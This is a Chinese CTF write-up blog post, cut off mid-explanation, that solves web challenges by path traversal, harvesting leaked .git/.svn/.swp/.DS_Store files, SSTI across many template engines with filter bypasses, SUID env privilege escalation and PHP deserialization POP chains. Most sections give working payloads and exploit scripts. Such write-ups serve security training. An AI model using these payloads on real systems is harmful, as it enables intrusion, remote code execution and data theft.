---
title: 青岑CTF有关WEB的WP（四）
description: WEB 入门系列结束咯
date: 2026-05-03 15:47:11
updated: 2026-05-03 15:47:11
image: https://img.yanxisishi.top/images/2026/05/ec329fc5f39043d2d5e647235c95cc17_720.png
categories: [CTF]
tags: [CTF, WP]
---

## basic_14

```php
<?php
highlight_file(__FILE__);
$flag = fopen('/admin_secret.txt', 'r');
if (isset($_GET['filename']) && strlen($_GET['filename']) < 17) {
  readfile($_GET['filename']);
} else {
  echo "The filename parameter does not exist or the filename is too long";
}
?>
```

核心在：

```php
$flag = fopen('/admin_secret.txt', 'r');
```

程序虽然打开了目标文件，但并没有对 `$flag` 进行读取和输出操作。

在 Linux 环境下，当进程使用 `fopen` 打开一个文件时，系统会在 `/proc/self/fd/` 目录下创建一个指向该文件的文件描述符。

通常情况下，0、1、2 分别被系统的标准输入、标准输出、标准错误占用。所以这个新打开的 `/admin_secret.txt` 的文件描述符通常会分配为 `3` 或以上。

最后测试出来是：

```http
?filename=/proc/self/fd/5
```

## EZINFOLEAK

点击系统异常日志那一栏的打开，发现：

```txt
secret_file_b64=Zmw0Zy50eHQ=
```

base64 解码是 `fl4g.txt` ，在查看日志处可能存在目录穿越，输入：

```txt
../../../../../../fl4g.txt
```

拿到 flag ，也可以用：

```txt
../../../../../../proc/self/environ
```

## EZINFOLEAK_1

输入：

```txt
../../../../../../fl4g.txt
```

啥都没有，再试试：

```txt
....//....//....//....//....//....//fl4g.txt
```

拿到 flag ，也可以用：

```txt
....//....//....//....//....//....//proc/self/environ
```

## EZINFOLEAK_2

页面就存在 flag 的存放路径 `/app/flag.txt` ，但是直接访问没有。

题目提示：

```txt
该网站在近期将完成下线，请各位管理员在正式清理之前根据需要自行完成相关数据的备份或导出
```

推测存在备份文件，可以尝试爆破备份后缀名：

```txt
.zip
.rar
.tar
.tar.gz
.7z
.bak
.old
.swp
.txt
```

得出来是 `http://docker.qingcen.net:44450/flag.txt.bak` 存在备份：

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
    <script>
        // 等待DOM加载完成
        window.onload = function() {
            // 创建隐藏的链接并触发下载
            var link = document.createElement('a');
            link.href = '/flag.txt.bak?download=1';
            link.download = 'flag.txt.bak';
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            // 立即跳转回主页面
            window.location.href = '/';
        };
    </script>
</head>
<body>
</body>
</html>
```

访问 `http://docker.qingcen.net:44450/flag.txt.bak?download=1` 即可。

## EZINFOLEAK_3

页面提示：

```txt
存在一个未公开的诊断入口，便于开发者查看完整 PHP 配置信息。
```

dirsearch 扫目录扫出来 `/phpinfo.php` ，访问后找 `flag{` 就行。

## EZINFOLEAK_4

dirsearch 扫目录扫出来全是 `/.git/` ，是 Git 泄露了，用 GitHack 还原：

```bash
python3 GitHack.py 'http://docker.qingcen.net:44461/.git'
```

得到 flag.txt 。

## EZINFOLEAK_5

dirsearch 扫目录扫出来全是 `/.git/` ，和上题一样还原拿到源码 HKBRLMlv.php ：

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = $_POST['token'] ?? '';
    if ($token === 'get_flag') {
        $flag = getenv('FLAG') ?: '';
        echo $flag;
    }
}
?>
```

去 hackbar 在 `http://docker.qingcen.net:44465/HKBRLMlv.php` 传入 POST 值 `token=get_flag` 即可。

## EZINFOLEAK_6

dirsearch 扫目录扫出来依旧全是 `/.git/` ，但是 GitHack 只还原出来一个没用的 html文件。

说明真正的源码或 flag 大概率存在于**历史提交记录**或其他的暂存分支中（即曾经提交过，但为了防泄露在最新版本中被删除了）。

接下来使用 git-dumper 提取并分析整个 Git 仓库的历史记录：

```bash
git-dumper http://docker.qingcen.net:44468/.git/ xixi
cd xixi
```

1. 审计历史提交记录：

   使用以下命令查看所有分支的提交历史，并显示每次提交具体增删了哪些文件。重点寻找类似 "remove flag"、"delete code"、"update" 这样的提交信息，或者注意观察哪个 commit ID 删除了可疑的 PHP 或 TXT 文件。

   ```bash
   git log --all --stat
   ```

2. 查看所有历史提交的具体代码差异：

   ```bash
   git log -p
   ```

3. 查看历史 Commit 中的内容：

   假设发现了一个可疑的 commit ID（例如哈希值是 `8f3a9b2...`），可以直接使用 `git show` 查看那次提交的具体代码变更，flag 往往在被标红的删除行里：

   ```bash
   git show 8f3a9b2...
   ```

4. 把整个本地文件夹直接回滚到那个存在源码的历史状态：

   ```bash
   git reset --hard 8f3a9b2...
   ```

5. 检查其他隐藏位置：

   如果在历史 commit 里没找到，再检查一下是不是在其他分支或者暂存区：

   + 查看所有分支：`git branch -a` （若有特殊分支，用 `git checkout 分支名` 切换）。
   + 查看暂存区：`git stash list` （若有回显，用 `git stash pop` 弹出隐藏的更改）。

本题只需要输入 `git log -p` 。

## EZINFOLEAK_7

dirsearch 扫目录扫出来全是 `/.svn/` ，用工具 dvcs-ripper 还原：

```bash
./rip-svn.pl -u http://docker.qingcen.net:44476/.svn/
```

得到 index.php 和 flag.php 。

如果当前目录没有拉取到什么文件，可用：

```bash
ls -la
```

查看当前目录是否多了一个 `.svn` 隐藏文件夹，如果有的话输入：

```bash
svn revert -R .
```

得到 index.php 和 flag.php 。

## EZINFOLEAK_8

dirsearch 扫目录扫出来全是 `/.hg/` ，可以接着用 dvcs-ripper 还原：

```bash
./rip-hg.pl -v -u http://docker.qingcen.net:44484/.hg/
```

得到 index.php 和 flag.php 。

## EZINFOLEAK_9

查看源码，注释里提示：

```html
<!-- 管理员说该站点已停用，但他刚才还用 vim 打开过flag.txt -->
```

当使用 vim 编辑器编写 flag.txt 文件时，会有一个 .flag.txt.swp 文件产生，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来。

直接访问 `http://docker.qingcen.net:44487/.flag.txt.swp` 得到 flag ：

```bash
curl http://docker.qingcen.net:44487/.flag.txt.swp
```

## EZINFOLEAK_10

查看源码，注释里提示：

```html
<!-- 都怪你们，害我被傻逼千鹤骂了。我开vim把flag.txt删掉了，这下应该没问题了 -->
```

仍然是 .flag.txt.swp 文件，用 curl 拉取下来：

```bash
curl -O http://docker.qingcen.net:44492/.flag.txt.swp
```

是一个二进制文件，用 strings 找可用信息：

```bash
strings -a .flag.txt.swp
```

得到 flag 。

## EZINFOLEAK_11

dirsearch 扫目录扫出来 `/.DS_Store` ，下载 `.DS_Store` 到本地：

```bash
curl -O http://docker.qingcen.net:44496/.DS_Store
```

是一个二进制文件，用 strings 找可用信息：

```bash
strings -a .DS_Store
```

得到 flag 。

## EZINFOLEAK_12

dirsearch 扫目录扫出来 `/.DS_Store` ，下载 `.DS_Store` 到本地：

```bash
curl -O http://docker.qingcen.net:44439/.DS_Store
```

是一个二进制文件，用 strings 找可用信息：

```bash
# 普通 ASCII
strings -a .DS_Store
# 扩展单字节字符
strings -a -e S .DS_Store
# UTF-16BE
strings -a -e b .DS_Store
# UTF-16LE
strings -a -e l .DS_Store
# UTF-32BE
strings -a -e B .DS_Store
# UTF-32LE
strings -a -e L .DS_Store
```

只有 `strings -a -e b .DS_Store` 找出来最正常：

```txt
.archive
finder-cache-0
.sync_part_aa
finder-cache-1
.sync_part_ab
finder-cache-2
.sync_part_ac
finder-cache-3
.sync_part_ad
finder-cache-4
.sync_part_ae
finder-cache-5
```

根据泄露的文件路径，用 curl 查看回显：

```bash
curl http://docker.qingcen.net:44439/.archive/.sync_part_aa
curl http://docker.qingcen.net:44439/.archive/.sync_part_ab
curl http://docker.qingcen.net:44439/.archive/.sync_part_ac
curl http://docker.qingcen.net:44439/.archive/.sync_part_ad
curl http://docker.qingcen.net:44439/.archive/.sync_part_ae
```

返回：

```txt
H4sIAAAAAAAAA0vLSUyvTkyzSDFNM0nUNUk1s9A1SUlM1LWwsLTQNTZLSjIyTkoySUs1qAUAcX3v
CCoAAAA=
```

注意开头：

```
H4sIA
```

很多时候代表：**gzip 文件内容被 base64 编码后得到的字符串**。

所以需要：

```txt
H4sIA...AAAA=
↓ base64 -d
gzip 压缩数据
↓ gzip -d
原始内容
```

即：

```bash
echo 'H4sIAAAAAAAAA0vLSUyvTkyzSDFNM0nUNUk1s9A1SUlM1LWwsLTQNTZLSjIyTkoySUs1qAUAcX3v
CCoAAAA=' | base64 -d | gzip -d
```

得到 flag 。

## EZSSTI

已知是 SSTI ，先指纹识别。通过 Wappalyzer 确认是 Node.js 。

常见的 Node.js 模板引擎探测 Payload 如下：

1. **EJS:** `<%= 7*7 %>` -> 49
2. **Pug (原 Jade):** `#{7*7}` -> 49
3. **Nunjucks:** `{{7*7}}` -> 49 （并且 `{{7/0}}` 返回 Infinity）
4. **Handlebars:** `{{7*7}}` -> 原样输出或空白（不支持直接运算）
5. **原生 JS 模板字符串:** `${7*7}` -> 49

当输入 `<%= 7*7 %>` 后，最底下的智能摘要回显 `49` ，确认是 EJS ，输入：

```js
<%= process.mainModule.require('child_process').execSync('cat /flag').toString() %>
```

## EZSSTI_1

依旧 Node.js ，经测试是 Pug ，输入：

```js
#{global.process.mainModule.require('child_process').execSync('cat /flag').toString()}
```

但是无回显，意识到因为这个注入点是 **Pug 行级注入**，\#{...} 在这里会被当成“标签名插值”，不是纯文本输出。

所以 payload 实际回显会变成类似：

```html
<flag{...}></flag{...}>
```

所以查看源码即可。

## EZSSTI_2

依旧 Node.js ，经测试是 Nunjucks ，输入：

```js
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag').toString()")()}}
```

但回显为空，原因是这题的 Nunjucks 上下文里 range 不可用。

但是可以用：

```js
{{[].pop.constructor('return process.mainModule.require("child_process").execSync("cat /flag").toString()')()}}
```

或者：

```js
{{''.constructor.constructor('return process.mainModule.require("child_process").execSync("cat /flag").toString()')()}}
```

## EZSSTI_3

用 whatweb 进行指纹识别得到：

```bash
http://docker.qingcen.net:44523/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[198.18.0.31], PHP[7.4.33], Title[图书馆查询], X-Powered-By[PHP/7.4.33]
```

常见的 PHP 模板引擎探测 Payload 如下：

1. Smarty: `{7*7}` -> 49 
2. Twig: `{{7*7}}` -> 49 （并且 `{{7/0}}` 返回空或抛出 Twig_Error_Runtime 异常） 
3. Blade (Laravel): `{{7*7}}` -> 49 （并且 `{{7/0}}` 会抛出原生的 PHP Division by zero 错误） 
4. ThinkPHP: `{:7*7}` -> 49

经测试是 Smarty ，输入：

```php
{system('cat /flag')}
```

## EZSSTI_4

依旧 PHP ，经测试是 Blade ，输入：

```php
{{system('cat /flag')}}
```

## EZSSTI_5

依旧 PHP ，经测试是 Twig ，输入：

```php
{{["cat /flag"]|map("system")|join(",")}}
```

报错了，说明当前的 Twig 环境不支持 `map` 过滤器，是因为目标环境使用的 Twig 版本较低。

输入：

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}}
```

## EZSSTI_6

指纹识别得到又变成了 Python 。

常见的 Python 模板引擎探测 Payload 如下：

1. **Jinja2 / Tornado:** `{{7*7}}` -> 49 （若需进一步区分，可输入 `{{7*'7'}}`，Jinja2 会回显 `7777777`）

2. **Mako:** `${7*7}` -> 49

3. **Django:** `{{7*7}}` -> 原样输出、空白或报错（默认不支持直接在此类标签内进行复杂的数学运算）

经测试是 Mako ，输入：

```python
${__import__("os").popen("cat /flag").read()}
```

## EZSSTI_7

依旧 Python ，经测试是 Jinja2 ，输入：

```php
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
```

返回 `500: Internal Server Error` 。

输入：

```python
{{"".__class__.__base__.__subclasses__()[【target】]}}
```

对`【target】`处用bp或者脚本爆破 0-500 ，直到找到 `<class 'os._wrap_close'>` ，得到是 141 。

输入：

```python
{{"".__class__.__base__.__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}
```

## EZSSTI_8

依旧 Python ，经测试还是 Jinja2 ，沿用上一题的 payload ：

```python
{{"".__class__.__base__.__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}
```

## EZSSTI_9

依旧 Python ，经测试还是 Jinja2 ，沿用上一题的 payload ：

```python
{{"".__class__.__base__.__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}
```

## EZSSTI_10

依旧 Python ，经测试还是 Jinja2 ，沿用上一题的 payload ：

```python
{{"".__class__.__base__.__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}
```

返回：

```txt
查询内容禁止包含危险关键字
```

经测试，过滤了：

```txt
__class__
__base__
__subclasses__
__globals__
__import__
self
import
session
lipsum
cycler
namespace
Joiner
get_flashed_messages
```

利用**attr() 接受字符串，支持编码或中转**，输入：

```python
{{""|attr("__cla"+"ss__")|attr("__ba"+"se__")|attr("__subcla"+"sses__")()[141]}}
```

等价于 `{{"".__class__.__base__.__subclasses__()[141]}}` ，但返回 `Internal Server Error` ，输入：

```python
{{""|attr("__cla"+"ss__")}}
```

可以正常回显 `<class 'str'>` ，推测索引 `[141]` 已经不是原本的 `<class 'os._wrap_close'>` ，需要重新爆破。

重新用 bp 爆破发现找不到 `<class 'os._wrap_close'>` ，找找下面列表的索引：

```txt
os._wrap_close
warnings.catch_warnings
_frozen_importlib.BuiltinImporter
subprocess.Popen
_Printer
```

一个都找不到，只能换思路了，不用索引流，改用直连流：

```txt
url_for
lipsum  被过滤
self  被过滤
config
Cycler  被过滤
Joiner  被过滤
Namespace  被过滤
get_flashed_messages  被过滤
current_app
```

除去被过滤了的，还可以用：

```python
{{(url_for|attr("__glo"+"bals__"))["os"].popen('cat /flag').read()}}
```

```python
{{(config|attr("__in"+"it__")|attr("__glo"+"bals__"))["os"].popen('cat /flag').read()}}
```

```python
{{(current_app|attr("__in"+"it__")|attr("__glo"+"bals__"))["__builtins__"]["__im"+"port__"]("os").popen('cat /flag').read()}}
```

**注意：**使用`|attr()`时，要注意**管道符优先级低于点号**，**如果管道符后续出现点号，前面要用括号包裹** ，比如不能输入：

```python
{{url_for|attr("__glo"+"bals__")["os"].popen('cat /flag').read()}}
```

## EZSSTI_12

不知道新过滤了什么，上题的 payload 全能用。

## EZSSTI_13

上题的 payload 都没有被拦截，可以查看目录，但是无法读取 flag ，查看一下权限：

```python
{{(url_for|attr("__glo"+"bals__"))["os"].popen('ls / -la').read()}}
```

返回：

```txt
total 60
drwxr-xr-x    1 root root 4096 Apr 27 15:41 .
drwxr-xr-x    1 root root 4096 Apr 27 15:41 ..
-rwxr-xr-x    1 root root    0 Apr 27 15:41 .dockerenv
lrwxrwxrwx    1 root root    7 Jan  2 12:35 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Jan  2 12:35 boot
drwxr-xr-x    5 root root  340 Apr 27 15:41 dev
-rwxr-xr-x    1 root root  749 Feb 19 12:35 entrypoint.sh
drwxr-xr-x    1 root root 4096 Apr 27 15:41 etc
-r--------    1 root root   42 Apr 27 15:41 flag
drwxr-xr-x    2 root root 4096 Jan  2 12:35 home
lrwxrwxrwx    1 root root    7 Jan  2 12:35 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Jan  2 12:35 lib64 -> usr/lib64
drwxr-xr-x    2 root root 4096 Feb  2 00:00 media
drwxr-xr-x    2 root root 4096 Feb  2 00:00 mnt
drwxr-xr-x    1 root root 4096 Mar 16 12:32 opt
dr-xr-xr-x 1265 root root    0 Apr 27 15:41 proc
drwx------    1 root root 4096 Feb  4 20:23 root
drwxr-xr-x    3 root root 4096 Feb  2 00:00 run
lrwxrwxrwx    1 root root    8 Jan  2 12:35 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Feb  2 00:00 srv
dr-xr-xr-x   13 root root    0 Jan 30 15:09 sys
drwxrwxrwt    2 root root   40 Apr 27 15:41 tmp
drwxr-xr-x    1 root root 4096 Feb  2 00:00 usr
drwxr-xr-x    1 root root 4096 Feb  2 00:00 var
```

**`-r--------`**：这是文件权限标志位。

- 第一个 `-` 代表这是一个普通文件。
- 接下来的 `r--` 代表**文件的拥有者只有读取（read）权限**，不能写入或执行。
- 中间的 `---` 代表**文件所属的用户组没有任何权限**。
- 最后的 `---` 代表**其他所有用户没有任何权限**。

**`root root`**：这表示该文件的拥有者是 `root` 用户，所属组也是 `root` 组。

**`42`**：文件大小为 42 字节（这就是 flag 字符串的长度）。

输入：

```python
{{(url_for|attr("__glo"+"bals__"))["os"].popen('id').read()}}
```

查看当前权限，返回：

```txt
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

说明当前所处的系统用户叫做 `ctf`，这是一个毫无特权的普通用户。

当一个可执行文件被赋予了 SUID 权限后（在 `ls -l` 中会显示为 `s`，例如 `-rwsr-xr-x`），**任何普通用户在运行这个程序时，该程序在执行期间会临时继承其所有者（通常是 root）的最高权限。**接下来可以尝试寻找被赋予了 SUID 权限的特殊可执行文件：

```python
{{(url_for|attr("__glo"+"bals__"))["os"].popen('find / -perm -4000').read()}}
```

+ **`find /`**：从根目录 `/` 开始，递归向下查找所有子目录。

+ **`-perm -4000`**：匹配权限标志位中包含 SUID（数字表示为 4000）的文件。

返回：

```txt
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/umount
/usr/bin/passwd
/usr/local/bin/env
```

这个列表里绝大多数都是 Linux 系统自带的“合法且安全”的 SUID 程序，它们的功能被严格锁死。常见的可以用来提权的异常 SUID 二进制文件包括但不限于：

1. **`/usr/local/bin/env`** 
2. **`find`**
3. **`vim`** 或 **`vi`**
4. **`bash`** 或 **`sh`**
5. **`python`**、**`php`**、**`perl`** 等解释器
6. 或者是出题人自己写的一个放在非标准目录（比如 `/app` 或根目录下）的奇怪二进制文件。

这题可以利用 `/usr/local/bin/env` 来提权：

```python
{{(url_for|attr('__glo'+'bals__'))['os'].popen('/usr/local/bin/env cat /flag').read()}}
```

## EZSSTI_14

输入：

```python
{{(url_for|attr("__glo"+"bals__"))["os"].popen('ls / -la').read()}}
```

返回 `禁止回显` ，说明这题是无回显 SSTI 。可以把未回显的 flag 写入其他文件里：

```python
{{(url_for|attr("__glo"+"bals__"))["os"].popen("mkdir -p /app/static;cat /flag > /app/static/1.txt 2>&1").read()}}
```

这里我的做法思路跟 [who'ssti revenge](https://blog.yanxisishi.top/2026/qingcen_web_01#whossti-revenge) 这题差不多，感兴趣的可以看看。

然后访问 `/static/1.txt` 。

## EZPOP_7

```php
<?php
class Vault {
    public $name;
    protected $id;
    private $age;

    public function setAge($age) {
        $this->age = $age;
    }

    public function getAge() {
        return $this->age;
    }

    public function __invoke($id) {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class VaultA extends Vault {
    public function __destruct() {
        echo file_get_contents('/secret.txt');
    }
}

class VaultB extends Vault {
    public function __set($key, $value) {
        $this->name = $value;
    }
}

class VaultC extends Vault {
    public function __check($age) {
        $mix = serialize([$this->getAge(), $this->name]);
        if (stripos($mix, "flag") !== false) {
            die("Hacker!");
        }
    }

    public function __wakeup() {
        $age = $this->getAge();
        $name = $this->id;
        $name->setAge($age);
        $name($this);
    }
}

class VaultD extends Vault {
    public $token = "none";

    public function __invoke($obj) {
        if (isset($obj->token) && $obj->token === "QCCTFyyds") {
            if (is_string($obj->name) && stripos($obj->name, "flag") === false) {
                eval($obj->name);
            }
        }
    }
}

function is_printable($s) {
    for ($i = 0; $i < strlen($s); $i++) {
        if (!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125)) {
            return false;
        }
    }
    return true;
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    $data = $_GET['data'];
    if (!is_printable($data)) {
        die("Nope");
    }
    $obj = @unserialize($data);
    if (!($obj instanceof VaultC)) {
        die("Nope");
    }
}
?>
```

> **extends**
>
> PHP 里的**继承**关键字，意思是：**一个类继承另一个类的属性和方法**。

1. 先看看对可控 GET 变量 data 的限制：

   1. 首先是：

      ```php
      $data = $_GET['data'];
      if (!is_printable($data)) {
          die("Nope");
      }
      ```

      > **is_printable()**
      >
      > 检测传入的字符串中是否只包含“可见字符”（在 ASCII 码表中的 32 到 125 位）

      在 PHP 中，当序列化一个包含 `protected` 或 `private` 属性的对象时，PHP 会在属性名中自动插入不可见的空字符（`\x00`）。由于空字符 `\x00` 的 ASCII 码是 0，属于不可见字符，经过 `is_printable()` 检测时就会直接触发 `die("Nope")`。

      **绕过方法：**

      利用 PHP 序列化的原生特性：**把表示字符串的小写 `s` 改成大写 `S`**。大写 `S` 允许在字符串里使用转义符，可以把不可见的 `\x00` 替换成可见的 `\00`。

      例如 `s:5:"\x00*\x00id"` 会被 `is_printable()` 拦截，但改成  `S:5:"\00*\00id"` 就不会被拦截了，且在反序列化时，PHP 引擎会自动将 `\00` 还原为 `\x00`。

   2. 其次是：

      ```php
      $obj = @unserialize($data);
      if (!($obj instanceof VaultC)) {
          die("Nope");
      }
      ```

      > **instanceof**
      >
      > 用于判断一个对象是否属于某个特定的类。

      `$obj instanceof VaultC` 限制了反序列化出来的最外层对象必须是 `VaultC` 类，即入口对象必须是 `VaultC`。

   **结论：**

   构造的序列化 payload 入口对象必须是 `VaultC` ，且需利用大写 `S` 将 `\x00` 转为 `\00` 以绕过可见字符检测。

2. 找链子终点：

   终点在 `VaultD::__invoke()` 里面的 `eval()`。

   ```php
   class VaultD extends Vault {
       public $token = "none";
   
       public function __invoke($obj) {
           if (isset($obj->token) && $obj->token === "QCCTFyyds") {
               if (is_string($obj->name) && stripos($obj->name, "flag") === false) {
                   eval($obj->name);
               }
           }
       }
   }
   ```

   > **is_string()**
   >
   > 检测指定的变量是否为字符串类型。例如 `is_string("flag")` 返回 `true`，`is_string(123)` 返回 `false`。

   > **stripos()**
   >
   > 查找字符串在另一字符串中首次出现的位置（不区分大小写），如果找到返回对应的位置索引，未找到则返回 `false`。

   1. 首先是： 

      ```php
      isset($obj->token) && $obj->token === "QCCTFyyds"
      ```

      传入对象必须包含 `token` 属性，且其值严格等于字符串 `"QCCTFyyds"`。

   2. 其次是：

      ```php
      is_string($obj->name)
      ```

      对象的 `name` 属性必须是字符串类型。

   3. 最后是：

      ```php
      stripos($obj->name, "flag") === false
      ```

      `name` 字符串中不能包含 `"flag"` 关键字。

3. 触发 `VaultD::__invoke()` ：

   当尝试以调用函数的方式调用一个对象时，`__invoke()`方法会被自动调用。

   找到 `VaultC::__wakeup()`：

   ```php
   class VaultC extends Vault {
           public function __wakeup() {
           $age = $this->getAge();
           $name = $this->id;
           $name->setAge($age);
           $name($this);
       }
   }
   ```

   关键代码是：

   ```php
   $name = $this->id;
   $name($this);
   ```

   如果让 `$this->id` 等于一个 `VaultD` 对象，那么 `$name($this);` 就相当于 `(new VaultD())($this);` ，所以触发 `VaultD::__invoke()` 。

   而这里传进去的 `$this`，正是当前的 `VaultC` 对象，所以需要让 `VaultC` 对象满足：

   ```txt
   VaultC::$id    = new VaultD()
   VaultC::$token = "QCCTFyyds"
   VaultC::$name  = "system('cat /secret.txt');"
   ```

   由于 `VaultC::__wakeup()` 可以做起点，且构造的序列化 payload 入口对象必须是 `VaultC` ，所以链子已经完整了，其他的类相当于干扰项。

4. 编写 exp：

   ```php
   <?php
   class VaultC {
       public $name = "system('cat /secret.txt');";
       protected $id;
   
       public function __construct() {
           $this->id = new VaultD();
       }
   }
   
   class VaultD {}
   
   $a = new VaultC();
   $a->token = "QCCTFyyds";
   echo urlencode(serialize($a));
   ```

   得到：

   ```txt
   O%3A6%3A%22VaultC%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A26%3A%22system%28%27cat+%2Fsecret.txt%27%29%3B%22%3Bs%3A5%3A%22%00%2A%00id%22%3BO%3A6%3A%22VaultD%22%3A0%3A%7B%7Ds%3A5%3A%22token%22%3Bs%3A9%3A%22QCCTFyyds%22%3B%7D
   ```

   再把 `%00` 改成 `%5C00`，即 `\00` ，同时把前面的 `s` 改成 `S` ，得到：

   ```txt
   O%3A6%3A%22VaultC%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A26%3A%22system%28%27cat+%2Fsecret.txt%27%29%3B%22%3BS%3A5%3A%22%5C00%2A%5C00id%22%3BO%3A6%3A%22VaultD%22%3A0%3A%7B%7Ds%3A5%3A%22token%22%3Bs%3A9%3A%22QCCTFyyds%22%3B%7D
   ```

   传入后返回：

   ```txt
   The secret is that the flag is inside the 'flag' file.
   ```

   重改一下 exp，记住 `flag` 被过滤了，要用通配符绕过：
   ```php
   <?php
   class VaultC {
       public $name = "system('cat /fla*');";
       protected $id;
   
       public function __construct() {
           $this->id = new VaultD();
       }
   }
   
   class VaultD {}
   
   $a = new VaultC();
   $a->token = "QCCTFyyds";
   echo urlencode(serialize($a));
   ```

   得到：

   ```txt
   O%3A6%3A%22VaultC%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A20%3A%22system%28%27cat+%2Ffla%2A%27%29%3B%22%3Bs%3A5%3A%22%00%2A%00id%22%3BO%3A6%3A%22VaultD%22%3A0%3A%7B%7Ds%3A5%3A%22token%22%3Bs%3A9%3A%22QCCTFyyds%22%3B%7D 
   ```

   改成：

   ```txt
   O%3A6%3A%22VaultC%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A20%3A%22system%28%27cat+%2Ffla%2A%27%29%3B%22%3BS%3A5%3A%22%5c00%2A%5c00id%22%3BO%3A6%3A%22VaultD%22%3A0%3A%7B%7Ds%3A5%3A%22token%22%3Bs%3A9%3A%22QCCTFyyds%22%3B%7D 
   ```

## EZPOP_8

```php
<?php
error_reporting(0);

final class StarRailCabin {
    public $crewBadge;
    public $catDoor;
    public $needle;
    public $haystack;

    public function __destruct() {
        if (isset($this->needle)) {
            $n = (string)$this->needle;
            if (strlen($n) > 5 || !is_numeric($n) || $n <= 999999) die("你行不行呀？");
            $gate = $this->catDoor;
            $gate->partner = "QingCen";
        }
    }
}

final class CatCafeGate {
    public $fortuneTeller;
    public $sparkler;

    public function __set($name, $value) {
        $oracle = $this->fortuneTeller;
        if ($oracle() === "QingCen") {
            $engine = $this->sparkler;
            $engine();
        }
    }
}

final class KleeFirework {
    public $spell;
    public $scroll;

    public function __invoke() {
        $cast = $this->spell;
        $words = $this->scroll;
        $cast($words);
    }
}

final class QingCen {
    public static function echo_name() {
        return "QingCen";
    }
}

highlight_file(__FILE__);

$payload = $_GET["data_qc.bz2"];
if (isset($payload)) {
    unserialize($payload);
} else {
    echo "上传类型不对哦";
}
?>
```

> **final**
>
> `final class` 表示这个类不能被继承；`final function` 表示这个方法不能被子类重写。

1. 先看对可控 GET 变量的限制：

   ```php
   $payload = $_GET["data_qc.bz2"];
   ```

   看起来需要传入：

   ```http
   ?data_qc.bz2=payload
   ```

   但是 PHP 解析 GET 参数名时，`[`、空格、`.` 会被转换成 `_`，即被转换为了：

   ```http
   ?data_qc_bz2=payload
   ```

   所以直接传 `data_qc.bz2` 不能被 `$_GET["data_qc.bz2"]` 正常取到。

   需要用 `data[qc.bz2` 来替代作为传入的变量名，原因是 PHP 解析参数名时，`[` 会被当成数组语法的开始，就不会转换 `.` 了。

2. 找链子终点：

   终点在 `KleeFirework::__invoke()` 里面：

   ```php
   final class KleeFirework {
       public $spell;
       public $scroll;
   
       public function __invoke() {
           $cast = $this->spell;
           $words = $this->scroll;
           $cast($words);
       }
   }
   ```

   这里的关键代码是：

   ```php
   $cast($words);
   ```

   如果让：

   ```php
   $cast = "system";
   $words = "cat /flag";
   ```

   那么最后就相当于执行：

   ```php
   system("cat /flag");
   ```

   所以需要让：

   ```php
   KleeFirework::$spell  = "system"
   KleeFirework::$scroll = "cat /flag"
   ```

3. 触发 `KleeFirework::__invoke()`：

   找到 `CatCafeGate::__set()`：

   ```php
   final class CatCafeGate {
       public $fortuneTeller;
       public $sparkler;
   
       public function __set($name, $value) {
           $oracle = $this->fortuneTeller;
           if ($oracle() === "QingCen") {
               $engine = $this->sparkler;
               $engine();
           }
       }
   }
   ```

   这里的关键代码是：

   ```php
   $engine = $this->sparkler;
   $engine();
   ```

   当一个对象被当成函数调用时，会自动触发这个对象的 `__invoke()` 方法。

   所以只需要让：

   ```php
   CatCafeGate::$sparkler = new KleeFirework()
   ```

   但是还需要满足：

   ```php
   $oracle() === "QingCen"
   ```

   也就是 `$oracle()` 的返回值必须严格等于 `"QingCen"`。

   题目中刚好给了一个现成的方法：

   ```php
   final class QingCen {
       public static function echo_name() {
           return "QingCen";
       }
   }
   ```

   所以令：

   ```php
   CatCafeGate::$fortuneTeller = "QingCen::echo_name"
   ```

   这样：

   ```php
   $oracle = $this->fortuneTeller;
   $oracle();
   ```

   就相当于执行 `QingCen::echo_name();` ，返回值为 `"QingCen"`。

4. 触发 `CatCafeGate::__set()`：

   在给不可访问（protected 或 private）或不存在的属性赋值时，`__set()` 会被调用。

   找到 `StarRailCabin::__destruct()`：

   ```php
   final class StarRailCabin {
       public $crewBadge;
       public $catDoor;
       public $needle;
       public $haystack;
   
       public function __destruct() {
           if (isset($this->needle)) {
               $n = (string)$this->needle;
               if (strlen($n) > 5 || !is_numeric($n) || $n <= 999999) die("你行不行呀？");
               $gate = $this->catDoor;
               $gate->partner = "QingCen";
           }
       }
   }
   ```

   这里的关键代码是：

   ```php
   $gate = $this->catDoor;
   $gate->partner = "QingCen";
   ```

   如果让：

   ```php
   StarRailCabin::$catDoor = new CatCafeGate()
   ```

   那么：

   ```php
   $gate->partner = "QingCen";
   ```

   就相当于：

   ```php
   CatCafeGate对象->partner = "QingCen";
   ```

   但是 `CatCafeGate` 类里面没有 `partner` 这个属性，所以给不存在的属性赋值时，就会自动触发 `CatCafeGate::__set()` 。

   但还需要满足：

   ```php
   if (strlen($n) > 5 || !is_numeric($n) || $n <= 999999) die("你行不行呀？");
   ```

   也就是 `$n` 需要同时满足：

   ```txt
   长度不能大于 5
   必须是数字
   必须大于 999999
   ```

   可以用科学计数法绕过：

